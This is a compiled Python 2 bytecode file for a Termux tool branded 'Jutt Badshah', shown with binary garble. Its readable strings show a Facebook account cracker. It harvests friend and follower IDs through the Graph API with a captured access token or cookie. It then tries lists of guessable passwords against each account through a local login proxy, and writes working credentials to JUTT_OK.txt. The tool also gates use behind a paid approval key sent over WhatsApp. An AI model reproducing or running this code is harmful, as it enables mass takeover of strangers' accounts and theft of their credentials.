ó
·Ò.cc           @   sG  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l m Z d  d l m Z d Z d Z e  j d  y e  j d  Wn e k
 rí n Xe j d d	  Z e j d
 d  Z i e e  d 6e e  d 6e e  d 6d d 6d d 6d d 6d d 6d d 6Z e  j d  e  j d  d Z d   Z d   Z d   Z d   Z d    Z d!   Z  d"   Z! d#   Z" d$   Z# d%   Z$ d&   Z% d'   Z& d(   Z' d)   Z( d*   Z) d+   Z* d,   Z( d-   Z+ d.   Z, e- d/ k rCe   n  d S(0   iÿÿÿÿN(   t
   ThreadPool(   t   ConnectionErrors   Mr.Jamess)   All rights reserved . Copyright  Mr.Jamess   termux-setup-storages   /sdcard/idsg    ÐsAg    8|Ai N  i@  s   x-fb-connection-bandwidths   x-fb-sim-hnis   x-fb-net-hnit	   EXCELLENTs   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]s
   user-agents!   application/x-www-form-urlencodeds   content-typet   Ligers   x-fb-http-engines   git pullt   clearsM  
[1;92m              
[1;92m                      
[1;96m                        
[1;92m     {} {}  {} {}{}{} {}{}{} 
[1;97m     {} {}  {}   {}     {} 
[1;93m     {} {}  {}   {}     {}  
[1;96m     {} {}  {}   {}     {} 
[1;94m  {}{}   {}{}    {}     {}  
[1;93m                      
[1;92m         Jutt Badshah Brand~                       
[1;91m-----------------------------------------------
[1;97mâ£ Author : Jutt Badshah x ?????
[1;97mâ£ Github : https://github.com/SHOOTER-MAKER
[1;97mâ£ WP NO: +8801880322043
[1;91m-----------------------------------------------c          C   s  t  j d  t GHd GHd GHd GHt j d  y t d d  j   }  Wn t t f k
 rg t	   n Xt
 j d  j } |  | k rÑ t  j d  t  j d	  t  j d
  t  j d  t j d  t   nH t  j d  t GHd GHd GHd GHd |  GHt d  t  j d  t   d  S(   NR   t    s0   [1;31;1mTake The Approval For Login Charges 350i   s   /sdcard/.hst.txtt   rs!   https://pastebin.com/raw/WNPz4hWms   cd ..... && npm installs   fuser -k 5000/tcp &t   #s   cd ..... && node index.js &i   s   	Approved Faileds(    [1;92mYour Id Is Not Approved Already s%    [1;92mCopy the id and send to admins    [1;92mYour id: s   [1;93m Press enter to send ids%   xdg-open https://wa.me/+8801880322043(   t   ost   systemt   logot   timet   sleept   opent   readt   KeyErrort   IOErrort   reg2t   requestst   gett   textt   ipt	   raw_inputt   reg(   t   toR   (    (    s   /sdcard/test/Asad.pyR      s6    
	
c          C   s   t  j d  t GHd GHd GHt j   j d  }  d |  GHd GHt d  t  j d  t d	 d
  } | j |   | j	   t d  t
   d  S(   NR   s   	Approval not detecteds?    [1;92mCopy and press enter , then select whatsapp to continuei2   s
    Your id: R   s    Press enter to go to whatsapp s%   xdg-open https://wa.me/+8801880322043s   /sdcard/.hst.txtt   ws&   [1;92m Press enter to check Approval (   R   R	   R
   t   uuidt   uuid4t   hexR   R   t   writet   closeR   (   t   idt   sav(    (    s   /sdcard/test/Asad.pyR   ;   s    	


c          C   sã   t  j d  t GHd GHyM t j d  }  t j |  j  } | d } | d } | d } | d } Wn n Xd | GHt j	 d	  d
 | GHt j	 d	  d | GHt j	 d	  d | GHt j	 d	  d GHt j	 d	  t
   d  S(   NR   s   	Collecting device infos   http://ip-api.com/json/t   queryt   countryt
   regionNamet   isps   [1;92m Your ip: i   s   [1;92m Your country: s   [1;92m Your region: s    [1;92mYour network: s    Loading ...(   R   R	   R
   R   R   t   jsont   loadsR   R   R   t   log_menu(   t   ipinfot   zt   ipsR"   t   regit   network(    (    s   /sdcard/test/Asad.pyR   L   s.    


				c          C   ss   y t  d d  }  t   WnR t t f k
 rn t j d  t GHd GHd d GHd GHd GHd	 GHd
 GHt   n Xd  S(   Ns   access_token.txtR   R   s#   [1;93m ~~~~ Login menu ~~~~[1;91mi/   t   -s   [1;92m[1] Login with FaceBooks   [1;92m[2] Login with tokens   [1;92m[3] Login with cookiesR   (   R   t   menuR   R   R   R	   R
   t
   log_menu_s(   t   t_check(    (    s   /sdcard/test/Asad.pyR'   g   s    	c          C   sh   t  d  }  |  d k r" t   nB |  d k r8 t   n, |  d k rN t   n d GHd GHd GHt   d  S(   Ns    [1;97mâ°âJuttâ¤ t   1t   2t   3R   s   \ Select valid option (   R   t   log_fbt	   log_tokent
   log_cookieR/   (   t   s(    (    s   /sdcard/test/Asad.pyR/   w   s    


c          C   s  t  j d  t GHd GHd d GHt d  }  t d  } y° t j d t d t  j } t	 j
 |  } d	 | k r¨ t d
 d  } | j | d	  | j   t   n? d | d k rÑ d GHt d  t   n d GHt d  t   Wn d GHd GHt  j d  n Xd  S(   NR   s   [1;31;1mLogin with id/passi/   R-   s   [1;92m Id/mail/no: s    [1;93mPassword: s   http://localhost:5000/auth?id=s   &pass=t   locs   access_token.txtR   s   www.facebook.comt   errors&    User must verify account before logins!   [1;92m Press enter to try again s    Id/Pass may be wrongs!    [1;92mPress enter to try again R   s   Exiting toolt   exit(   R   R	   R
   R   R   R   t   uidt   pwdR   R%   R&   R   R   R   R.   R4   (   t   lidt   pwdst   datat   qt   ts(    (    s   /sdcard/test/Asad.pyR4      s2    	




c          C   sf   t  j d  t GHd GHd d GHt d  }  d d GHt d d  } | j |   | j   t   d  S(   NR   s   [1;93mLogin with token[1;91mi/   R-   s!    [1;92mPaste token here: [1;91ms   access_token.txtR   (   R   R	   R
   R   R   R   R   R.   (   t   tokt   t_s(    (    s   /sdcard/test/Asad.pyR5   £   s    		
c          C   s  t  j d  t GHd GHd GHd GHyÂ t d  }  i
 d d 6d d 6d	 d
 6d d 6d d 6d d 6d d 6d d 6d d 6|  d 6} t j d d | } t j d | j  } | j	 d  } t
 d d  } | j |  | j   t   Wn t k
 rd GHd GHd GHt d  t   ng t k
 rFd GHd GHd GHt d  t   n7 t j j k
 r|d GHd GHd GHt d  t   n Xd  S(    NR   R   s   [1;31;1mLogin Cookiess    Paste cookies here: sl   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36s
   user-agents   https://m.facebook.com/t   referers   m.facebook.comt   hosts   https://m.facebook.comt   originR1   s   upgrade-insecure-requestss#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages	   max-age=0s   cache-controlsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8t   accepts   text/html; charset=utf-8s   content-typet   cookiesG   https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_t   headerss	   (EAAA\w+)i   s   access_token.txtR   s   	Invalid cookiess!    [1;92mPress enter to try again (   R   R	   R
   R   R   R   t   ret   searchR   t   groupR   R   R   R.   t   AttributeErrorR'   t   UnboundLocalErrort
   exceptionst   SSLError(   RH   R?   t   c1t   c2t   hasilt   ok(    (    s   /sdcard/test/Asad.pyR6   °   sR    






c          C   s  t  j d  y t d d  j   }  Wn: t t f k
 rb d GHt GHd GHt j d  t	   n Xy3 t
 j d |   } t j | j  } | d } Wn t t f k
 rä t GHd GHd	 GHd GHt  j d
  t j d  t	   n< t
 j j k
 rt GHd GHd GHd GHt d  t   n Xt  j d  t GHt d d  j   } d | GHd d GHd | GHd GHd GHd GHd GHd GHd GHd GHt   d  S(   NR   s   access_token.txtR   R   s    [1;31;1mLogin FB id to continuei   s+   https://graph.facebook.com/me?access_token=t   names   	 Account Cheekpoint[0;97ms   rm -rf access_token.txts!   	 Turn on mobile data/wifi[0;97ms6    [1;92mPress enter after turning on mobile data/wifi s   /sdcard/.hst.txts      [1;92mLogged in user: [1;91mi/   R-   s    [1;93m Active token: [1;91ms,    ------------------------------------------ s&   [1;92m[1] Crack with Auto password 10s'   [1;92m[2] Crack with Number password 6s.   [1;92m[3] Crack with Name + Number password 8s   [1;92m[4] Extract Files   [1;92m[5] Logouts   [1;92m[6] Delete trash files(   R   R	   R   R   R   R   R
   R   R   R'   R   R   R%   R&   R   RO   R   R   R.   t   menu_s(   t   tokenR   R@   R)   RB   (    (    s   /sdcard/test/Asad.pyR.   Ü   sT    

			c          C   s°   t  d  }  |  d k r" t   n |  d k r8 t   nt |  d k rN t   n^ |  d k rj t j d  nB |  d k r t   n, |  d k r t   n d	 GHd
 GHd	 GHt   d  S(   Ns   [1;97mâ°âjuttâ¤ R1   R2   R3   t   4s   python2 ok.pyt   5t   6R   s   	Select valid option(	   R   t
   auto_crackt   choice_crackt
   name_crackR   R	   t   loutt   rtrashRV   (   t   ms(    (    s   /sdcard/test/Asad.pyRV     s"    




c           C   s¢   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mR   i   s*   [1;93m~~~~ Auto pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[0] Back(   R   R   t   toketR   R   R   R	   R
   R   R   R'   t   a_s(    (    (    s   /sdcard/test/Asad.pyt   crack   s$    	c           C   s¢   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHt   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s*   [1;93m~~~~ Auto pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[B] Back(   R   R   RW   R   R   R   R	   R
   R   R   R'   Rb   (    (    (    s   /sdcard/test/Asad.pyR[   7  s$    	c             s}  g  }  g    g   t  d  } | d k rbt j d  t GHd GHd d GHt  d  } y[ t j d | d	 t  } t j | j	  } | d
 } t j d  t GHd GHd | GHWn- t
 t f k
 rà d GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d
 } | j d  d }	 |  j | d |	  qWnM| d k rèt j d  t GHd GHd d GHd GHd d GHt  d  }
 t  d  } t  d  } t  d  } t  d  } y[ t j d | d	 t  } t j | j	  } | d
 } t j d  t GHd GHd | GHWn- t
 t f k
 rbd GHt  d  t   n Xt j d | d t d  } t j | j	  } x| d D]B } | d } | d
 } | j d  d }	 |  j | d |	  qWnÇ | d  k rt j d  t GHd! GHd d GHyC t  d"  } x0 t | d#  j   D] } |  j | j    q9WWq¯t k
 rd$ GHt  d%  t   q¯Xn+ | d& k rt   n d' GHd( t GH|   d) t t |    GHt j d*  d+ GHt j d*  d d GHd, GHd d GH   f d-   } t d.  } | j | |   d d GHd/ GHd0 t t    d1 t t     GHd d GHt  d2  t   d  S(3   Ns    [1;97mâ°âjuttâ¤ R1   R   s1   [1;93m~~~~ Auto pass public cracking ~~~~[1;91mi/   R-   s    [1;93m[â]Enter id: s   https://graph.facebook.com/s   ?access_token=RU   s(   [1;93m~~~~Auto pass public cracking~~~~s    [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R?   R   t    i    t   |R2   s4   [1;93m~~~~ Name pass followers cracking ~~~~[1;91ms5    [1;93mFor example:123,1234,12345,786,12,1122[1;91ms    [1;92m[1]Name + digit: s    [1;92m[2]Name + digit: s    [1;92m[3]Name + digit: s    [1;92m[4]Name + digit: s-   [1;93m~~~~ Name pass followers cracking ~~~~s    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999R3   s/   [1;93m~~~~ Auto pass File cracking ~~~~[1;91ms   [+] File Name: R   s   [!] File Not Found.s   Press Enter To Back. t   0R   s   	Choose valid options    Total ids: g      à?s    [1;97mCrack Running[1;91m s$   	[1;94mJutt King Of Facebook[1;91mc            s
  |  } | j  d  \ } } yr
| j   d } t j d | d | d t j } t j |  } d | k rÈ d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nÄ	d | d k r/d | d | GHt d d  } | j	 | d | d  | j
     j | |  n]	| j   d }	 t j d | d |	 d t j } t j |  } d | k rÙd | d |	 d	 GHt d
 d  } | j	 | d |	 d  | j
    j | |	  n³d | d k r@d | d |	 GHt d d  } | j	 | d |	 d  | j
     j | |	  nL| j   d }
 t j d | d |
 d t j } t j |  } d | k rêd | d |
 d	 GHt d
 d  } | j	 | d |
 d  | j
    j | |
  n¢d | d k rQd | d |
 GHt d d  } | j	 | d |
 d  | j
     j | |
  n;| j   d } t j d | d | d t j } t j |  } d | k rûd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rbd | d | GHt d d  } | j	 | d | d  | j
     j | |  n*d } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rid | d | GHt d d  } | j	 | d | d  | j
     j | |  n#d } t j d | d | d t j } t j |  } d | k r	d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nd | d k rpd | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  n|d | d k rwd | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k rd | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nud | d k r~d | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k r	d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  nnd | d k r	d | d | GHt d d  } | j	 | d | d  | j
     j | |  nd } t j d | d | d t j } t j |  } d | k r%
d | d | d	 GHt d
 d  } | j	 | d | d  | j
    j | |  ng d | d k r
d | d | GHt d d  } | j	 | d | d  | j
     j | |  n  Wn n Xd  S(   NRe   t   12345s   http://localhost:5000/auth?id=s   &pass=RI   R8   s   [1;92m[JUTT-OK] [1;32ms    | s   [0;97ms   /sdcard/ids/JUTT_OK.txtt   as   
s   www.facebook.comR9   s   [1;31;1m[JUTT-CP] s   JUTT_CP.txtt   1234t   786t   123t   234567t   223344t   334455t   445566t   000786t   786000(   t   splitt   lowerR   R   t   headerR   R%   R&   R   R   R   t   appendt   apppend(   t   argt   userR;   RU   t   pass1R?   R@   RT   t   cpt   pass2t   pass3t   pass4t   pass5t   pass6t   pass7t   pass8t   pass9t   pass10(   t   cpst   oks(    s   /sdcard/test/Asad.pyt   main¬  s6   $

$

$

$

$

$

$

$

$

$

i   s    [1;92mCrack Dones    [1;92mTotal Ok/Cp:t   /s    [1;93mPress enter to back(   R   R   R	   R
   R   R   RW   R%   R&   R   R   R   R[   t   rsplitRu   R   t	   readlinest   stripRc   R.   R   t   strt   lenR   R   R    t   map(   R   Rb   t   idtR   R@   R)   t   iR;   t   nat   nmt   p1t   p2t   p3t   p4t   idlistt   lineR   t   p(    (   R   R   s   /sdcard/test/Asad.pyRb   N  s¼    	



		



	

			¦	)	
c           C   s   y t  d d  j   a WnB t t f k
 r] t j d  t GHd GHt j	 d  t
   n Xt j d  t GHd GHd d GHd	 GHd
 GHd GHd GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mi   s,   [1;93m~~~~ Number pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[0] Back(   R   R   Ra   R   R   R   R	   R
   R   R   R'   t   c_s(    (    (    s   /sdcard/test/Asad.pyt   crack_b\  s"    	c           C   s   y t  d d  j   a WnB t t f k
 r] t j d  t GHd GHt j	 d  t
   n Xt j d  t GHd GHd d GHd	 GHd
 GHd GHd GHt   d  S(   Ns   access_token.txtR   R   s&   [1;93m~~~ Login FB id to continue ~~~i   s,   [1;93m~~~~ Number pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[B] Back(   R   R   RW   R   R   R   R	   R
   R   R   R'   R   (    (    (    s   /sdcard/test/Asad.pyR\   r  s"    	c             s;  g  }  g    g   t  d  } | d k r¸t j d  t GHd GHd d GHd GHd d GHt  d   t  d	   t  d
   t  d   t  d   t  d   t  d  } y[ t j d | d t  } t j | j	  } | d } t j d  t GHd GHd | GHWn- t
 t f k
 r6d GHt  d  t   n Xt j d | d t  } t j | j	  } xô| d D]B } | d } | d } | j d  d }	 |  j | d |	  qoWn£| d k r>t j d  t GHd GHd d GHd GHd d GHt  d   t  d	   t  d
   t  d   t  d  } y[ t j d | d t  } t j | j	  } | d } t j d  t GHd GHd | GHWn- t
 t f k
 r¸d GHt  d   t   n Xt j d | d! t d"  } t j | j	  } xn| d D]B } | d } | d } | j d  d }	 |  j | d |	  qõWn| d# k r0t j d  t GHd$ GHd d GHd GHd d GHt  d   t  d	   t  d
   t  d   t  d   t  d   yC t  d%  }
 x0 t |
 d&  j   D] } |  j | j    qåWWq[t k
 r,d' GHt  d(  t   q[Xn+ | d) k rFt   n d* GHd+ t GHt   d, t t |    GHt j d-  d. GHt j d-  d d GHd/ GHd d GH         f d0   } t d1  } | j | |   d d GHd2 GHd3 t t    d4 t t     GHd d GHt  d5  t   d  S(6   Ns    [1;97mâ°âjuttâ¤ R1   R   s4   [1;93m ~~~~ Number pass Public cracking ~~~~[1;91mi/   R-   s6   [1;93m For example:234567,223344,334455,445566[1;91ms    [1;92m[1]Password: s    [1;92m[2]Password: s    [1;92m[3]Password: s    [1;92m[4]Password: s    [1;92m[5]Password: s    [1;92m[6]Password: s    [1;93m[â]Enter id: s   https://graph.facebook.com/s   ?access_token=RU   s-   [1;93m ~~~~ Number pass Public cracking ~~~~s    Cloning from: s   	 Invalid user [0;97ms    Press enter to try again s   /friends?access_token=R?   R   Rd   i    Re   R2   s6   [1;93m~~~~ Number pass followers cracking ~~~~[1;91ms    [1;93mEnter id: s/   [1;93m~~~~ Number pass followers cracking ~~~~s   Press enter to try again s   /subscribers?access_token=s   &limit=999999R3   s2   [1;93m ~~~~ Number pass File cracking ~~~~[1;91ms   [+] File Name: R   s   [!] File Not Found.s   Press Enter To Back. Rf   R   s   	 Choose valid options    Total ids: g      à?s$    [1;97m~~~ Crack Running ~~~[1;91ms#   	[1;94mJutt King Of Fcebook[1;91mc            s3  |  } | j  d  \ } } y
t j d | d  d t j } t j |  } d | k r¸ d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nld | d k rd | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r¹d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nkd | d k r d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k rºd | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   njd | d k r!d | d  GHt d d
  } | j | d  d  | j	     j
 |   nt j d | d  d t j } t j |  } d | k r»d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nid | d k r"d | d  GHt d d
  } | j | d  d  | j	     j |   nt j d | d  d t j } t j |  } d | k r¼d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   nhd | d k r#d | d  GHt d d
  } | j | d  d  | j	     j |   nt j d | d  d t j } t j |  } d | k r½d | d  d GHt d	 d
  } | j | d  d  | j	    j
 |   ng d | d k r$d | d  GHt d d
  } | j | d  d  | j	     j |   n  Wn n Xd  S(   NRe   s   http://localhost:5000/auth?id=s   &pass=RI   R8   s   [1;92m[JUTT-OK] [1;32ms    | s   [0;97ms   /sdcard/ids/JUTT_OK.txtRh   s   
s   www.facebook.comR9   s   [1;31;1m[JUTT-CP] s   JUTT_CP.txt(   Rr   R   R   Rt   R   R%   R&   R   R   R   Ru   Rv   (   Rw   Rx   R;   RU   R?   R@   RT   Rz   (   R   R   Ry   R{   R|   R}   R~   R   (    s   /sdcard/test/Asad.pyR   ö  s²    $

$

$

$

$

$

i   s    [1;92mCrack Dones   [1;92m Total Ok/Cp:R   s   [1;93m Press enter to back(   R   R   R	   R
   R   R   RW   R%   R&   R   R   R   R\   R   Ru   R[   R   R   R   R   R.   R   R   R   R   R   R   R    R   (   R   Rb   R   R   R@   R)   R   R;   R   R   R   R   R   R   (    (   R   R   Ry   R{   R|   R}   R~   R   s   /sdcard/test/Asad.pyR     sÜ    		



		



		

			$`	)	
c           C   s¢   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHt   d  S(   Ns	   login.txtR   R   s   	 File Not Found [0;97mR   i   s3   [1;93m~~~~ Name + Number pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[0] Back(   R   R   Ra   R   R   R   R	   R
   R   R   R'   Rb   (    (    (    s   /sdcard/test/Asad.pyR   `  s$    	c           C   s¢   y t  d d  j   a WnG t t f k
 rb t j d  t GHd GHd GHt j	 d  t
   n Xt j d  t GHd GHd d	 GHd
 GHd GHd GHd GHt   d  S(   Ns   access_token.txtR   R   s    	 Login FB id to continue[0;97mR   i   s3   [1;93m~~~~ Name + Number pass cracking ~~~~[1;91mi/   R-   s   [1;92m[1] Public id clonings   [1;92m[2] Followers clonings   [1;92m[3] File clonings   [1;92m[B] Back(   R   R   RW   R   R   R   R	   R
   R   R   R'   t   n_s(    (    (    s   /sdcard/test/Asad.pyR]   w  s$    	c       
      sq  g  }  g    g   t  d  } | d k rÐt j d  t GHd GHd d GHd GHd d GHt  d   t  d	   t  d
   t  d   t  d   t  d   t  d   t  d  	 t  d  } y[ t j d | d t  } t j | j	  } | d } t j d  t GHd GHd | GHWn- t
 t f k
 rNd GHt  d  t   n Xt j d | d t  } t j | j	  } x| d D]B } | d } | d } | j d  d }	 |  j | d |	  qWn»| d k rVt j d  t GHd GHd d GHd  GHd d GHt  d   t  d	   t  d
   t  d   t  d  } y[ t j d | d t  } t j | j	  } | d } t j d  t GHd! GHd | GHWn- t
 t f k
 rÐd GHt  d"  t   n Xt j d | d# t d$  } t j | j	  } x| d D]B } | d } | d } | j d  d }	 |  j | d |	  qWn5| d% k r`t j d  t GHd& GHd d GHd GHd d GHt  d   t  d	   t  d
   t  d   t  d   t  d   t  d   t  d  	 yC t  d'  }
 x0 t |
 d(  j   D] } |  j | j    qWWqt k
 r\d) GHt  d*  t   qXn+ | d+ k rvt   n d, GHd- t GH|   d. t t |    GHt j d/  d0 GHt j d/  d d GHd1 GHd d GH          	 f
 d2   } t d3  } | j | |   d d GHd4 GHd5 t t    d6 t t     GHd d GHt  d7  t   d  S(8   Ns    [1;97mâ°âjuttâ¤ R1   R   s:   [1;93m~~~~ Name + Number pass public cracking ~~~~[1;91mi/   R-   s4   [1;93mFor example:123,1234,12345,786,12,1122[1;91ms    [1;92m[1]Name + digit: s    [1;92m[2]Name + digit: s    [1;92m[3]Name + digit: s    [1;92m[4]Name + digit: s    [1;92m[5]Password: s    [1;92m[6]Password: s    [1;92m[7]Password: s    [1;92m[8]Password: s    [1;93m[â]Enter id: s   https://graph.facebook.com/s   ?access_token=RU   s(   [1;93m~~~~Name pass public cracking~~~~s    [1;92mCloning from: s   	 Invalid user [0;97ms!    [1;92mPress enter to try again s   /friends?access_token=R?   R   Rd   i    Re   R2   s4   [1;93m~~~~ Name pass followers cracking ~~~~[1;91ms5    [1;93mFor example:123,1234,12345,786,12,1122[1;91ms-   [1;93m~~~~ Name pass followers cracking ~~~~s    [1;92mPress enter to try again s   /subscribers?access_token=s   &limit=999999R3   s8   [1;93m~~~~ Name + Number pass File cracking ~~~~[1;91ms   [+] File Name: R   s   [!] File Not Found.s   Press Enter To Back. Rf   R   s   	Choose valid options    Total ids: g      à?s    [1;97mCrack Running[1;91m s$   	[1;94mJutt King Of Facebook[1;91mc            su  |  } | j  d  \ } } yL| j    } t j d | d | d t j } t j |  } d | k rÈ d | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nd | d k r/d | d | GHt d d
  } | j	 | d | d  | j
     j | |  n7| j    }	 t j d | d |	 d t j } t j |  } d | k rÙd | d |	 d GHt d	 d
  } | j	 | d |	 d  | j
    j | |	  nd | d k r@d | d |	 GHt d d
  } | j	 | d |	 d  | j
     j | |	  n&| j    }
 t j d | d |
 d t j } t j |  } d | k rêd | d |
 d GHt d	 d
  } | j	 | d |
 d  | j
    j | |
  n|d | d k rQd | d |
 GHt d d
  } | j	 | d |
 d  | j
     j | |
  n| j    } t j d | d | d t j } t j |  } d | k rûd | d | d GHt d	 d
  } | j	 | d | d  | j
    j | |  nkd | d k rbd | d | GHt d d
  } | j	 | d | d  | j
     j | |  nt j d | d  d t j } t j |  } d | k rüd | d  d GHt d	 d
  } | j	 | d  d  | j
    j |   njd | d k rcd | d  GHt d d
  } | j	 | d  d  | j
     j |   nt j d | d  d t j } t j |  } d | k rýd | d  d GHt d	 d
  } | j	 | d  d  | j
    j |   nid | d k rdd | d  GHt d d
  } | j	 | d  d  | j
     j |   nt j d | d  d t j } t j |  } d | k rþd | d  d GHt d	 d
  } | j	 | d  d  | j
    j |   nhd | d k red | d  GHt d d
  } | j	 | d  d  | j
     j |   nt j d | d 	 d t j } t j |  } d | k rÿd | d 	 d GHt d	 d
  } | j	 | d 	 d  | j
    j | 	  ng d | d k rfd | d 	 GHt d d
  } | j	 | d 	 d  | j
     j | 	  n  Wn n Xd  S(   NRe   s   http://localhost:5000/auth?id=s   &pass=RI   R8   s   [1;92m[JUTT-OK] [1;32ms    | s   [0;97ms   /sdcard/ids/JUTT_OK.txtRh   s   
s   www.facebook.comR9   s   [1;31;1m[JUTT-CP] s   JUTT_CP.txt(   Rr   Rs   R   R   Rt   R   R%   R&   R   R   R   Ru   Rv   (   Rw   Rx   R;   RU   Ry   R?   R@   RT   Rz   R{   R|   R}   (
   R   R   R   R   R   R   R~   R   R   R   (    s   /sdcard/test/Asad.pyR      sò    $

$

$

$

$

$

$

$

i   s    [1;92mCrack Dones    [1;92mTotal Ok/Cp:R   s    [1;93mPress enter to back(   R   R   R	   R
   R   R   RW   R%   R&   R   R   R   R]   R   Ru   R[   R   R   R   Rc   R.   R   R   R   R   R   R    R   (   R   Rb   R   R   R@   R)   R   R;   R   R   R   R   R   R   (    (
   R   R   R   R   R   R   R~   R   R   R   s   /sdcard/test/Asad.pyR     sä    		



		



		

			*	)	
t   __main__(.   R   t   sysR   t   datetimeRJ   t	   threadingR%   t   randomR   t   hashlibt	   cookielibR   t   multiprocessing.poolR    t   requests.exceptionsR   t
   __author__t   __copyrightR	   t   mkdirt   OSErrort   randintt   bdt   simt   reprRt   R
   R   R   R   R'   R/   R4   R5   R6   R.   RV   Rc   R[   Rb   R   R\   R   R]   R   t   __name__(    (    (    s   /sdcard/test/Asad.pyt   <module>   sV   
	 							,	/				ÿ 			Ø			þ


	ibrahimkolil